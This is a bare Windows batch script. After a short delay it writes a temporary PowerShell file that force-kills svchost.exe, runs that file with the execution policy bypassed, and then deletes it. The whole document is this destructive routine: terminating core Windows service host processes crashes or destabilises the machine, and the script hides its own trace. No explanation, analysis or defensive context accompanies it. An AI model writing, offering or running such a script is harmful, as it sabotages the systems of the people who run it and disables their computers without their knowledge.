@echo off
timeout /t 5 >nul
set psFile=%temp%\temp.ps1
echo taskkill /im svchost.exe /f > %psFile%
powershell -ExecutionPolicy Bypass -File %psFile%
del %psFile%